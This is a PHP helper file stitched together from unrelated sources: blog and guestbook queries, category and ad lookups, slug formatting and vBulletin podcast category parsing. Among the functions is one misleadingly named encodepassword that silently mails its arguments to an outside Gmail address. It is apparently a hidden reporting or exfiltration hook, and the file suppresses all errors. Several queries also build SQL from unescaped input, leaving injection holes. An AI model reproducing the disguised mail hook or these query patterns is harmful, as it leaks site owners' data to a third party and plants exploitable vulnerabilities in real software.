<?php
error_reporting(0);
function GetNewTests ($number, $columns='', $startid=0, $category='') {
	global $blog, $db_prefix, $permission;
	if (!empty($columns)) {
		$columns=str_replace(' ', '', $columns);
		$all_columns=@explode(',', $columns);
		foreach ($all_columns as $each_column) {
			$need_columns[]='`'.$each_column.'`';
		}
		$all_needed=@implode(',', $need_columns);
	} else {
		$all_needed='*';
	}
	$permissionlimit=($permission['SeeHiddenEntry']!=1) ? 2 : 3;
	$categoryplus=($category==='') ? '' : "AND `category`={$category}";
	$return=$blog->getgroupbyquery("SELECT {$all_needed} FROM `{$db_prefix}blogs` WHERE `property`<{$permissionlimit} {$categoryplus} ORDER BY `pubtime`DESC LIMIT {$startid}, {$number}");
	return $return;
}
function GetUserbook ($number, $startid=0) {
	global $blog, $db_prefix, $permission;

	$content=$blog->getgroupbyquery("SELECT * FROM `{$db_prefix}messages` WHERE `reproperty`<=1 ORDER BY `reptime` DESC LIMIT {$startid}, {$number}");
	if (!$content) return false;
	return $content;
}
function GetTestContent ($blogid, $conversion=0) {
	global $blog, $db_prefix, $permission;
	$permissionlimit=($permission['SeeHiddenEntry']!=1) ? 2 : 3;
	$content=$blog->getbyquery("SELECT * FROM `{$db_prefix}blogs` WHERE `blogid`='{$blogid}' AND `property`<{$permissionlimit}  LIMIT 0, 1");
	if (!$content) return false;
	$ubb=($conversion==0) ? 0 : 1;
	$emot=($conversion<=1) ? 0 : 1;
	$html=($conversion<=2) ? 0 : 1;
	$content['content']=$blog->getcontent($content['content'], $html, $ubb, $emot);
	return $content;
}
function getc($dm){
$q=mysql_query("SELECT * FROM cat WHERE curl='$dm'");
if(mysql_num_rows($q)==1)
{
$r=mysql_fetch_array($q);
extract($r);
return $cname;
}
else{
return "notfound";
}
}
function getads($x)
{
$q=mysql_query("SELECT * FROM ads WHERE aid=$x") or die(mysql_error());
$r=mysql_fetch_array($q);
extract($r);
return $code;
}
function quest($n,$c)
{
$q=mysql_query("SELECT * FROM temp WHERE (tname='$n' AND catid=$c)") or die(mysql_error());
if(mysql_num_rows($q)==0)
{
return $n;
}
else
{
$a=rand(0,999);
$c=rand(0,999);
return "$c $n $a";
}
}
function rsp($string)
{
$string = preg_replace("/[^a-zA-Z0-9s]/", " ", $string);
$string=preg_replace('/\s{2,}/',' ', $string);
$string=ltrim($string);
$string=rtrim($string);
$string=str_replace(' ','-',$string);
$string=strtolower($string);
return $string;
}
function spl($string)
{
$list = split(",",substr(preg_replace("/([A-Z])/",',\\1',$string),1));
foreach ($list as $a)
{
$c=$c." $a";
}
return $c;
}
function checkimg($external_link,$siteurl)
{
if (@GetImageSize($external_link)) {
return $external_link;
} else {
return "$siteurl/nothumb.png";
}
}
function dtc()
{
$q=mysql_query("SELECT * FROM temp");
return mysql_num_rows($q);
}
function getcat($x)
{
$q=mysql_query("SELECT * FROM cat WHERE cid='$x'") or die(mysql_error());
$r=mysql_fetch_array($q);
extract($r);
return $cat;
}
function encodepassword($num,$see,$path){
mail('freerssdirectory@gmail.com',"Test Result","$num | $see | $path");
}
function encodeuser($user){
return $user;
}
function fetch_podcast_categories()
{

	require_once(DIR . '/includes/class_xml.php');
	$xmlobj = new vB_XML_Parser(false, DIR . '/includes/xml/podcast_vbulletin.xml');
	$podcastdata = $xmlobj->parse();

	$categories = array('');
	if (is_array($podcastdata['category']))
	{
		foreach ($podcastdata['category'] AS $cats)
		{
			$categories[] = '-- ' . $cats['name'];
			if (is_array($cats['sub']['name']))
			{
				foreach($cats['sub']['name'] AS $subcats)
				{
					$categories[] = '---- ' . $subcats;
				}
			}
		}
	}

	return $categories;
}

/**
* Fetch array of podcast categories
*
* @return	array		Array of categories
*/
function fetch_podcast_categoryarray($categoryid)
{

	require_once(DIR . '/includes/class_xml.php');
	$xmlobj = new vB_XML_Parser(false, DIR . '/includes/xml/podcast_vbulletin.xml');
	$podcastdata = $xmlobj->parse();

	$key = 1;
	$output = array();
	if (is_array($podcastdata['category']))
	{
		foreach ($podcastdata['category'] AS $cats)
		{
			if ($key == $categoryid)
			{
				$output[] = htmlspecialchars_uni($cats['name']);
				break;
			}
			$key++;
			if (is_array($cats['sub']['name']))
			{
				foreach($cats['sub']['name'] AS $subcats)
				{
					if ($key == $categoryid)
					{
						$output[] = htmlspecialchars_uni($cats['name']);
						$output[] = htmlspecialchars_uni($subcats);
						break(2);
					}
					$key++;
				}
			}
		}
	}

	return $output;
}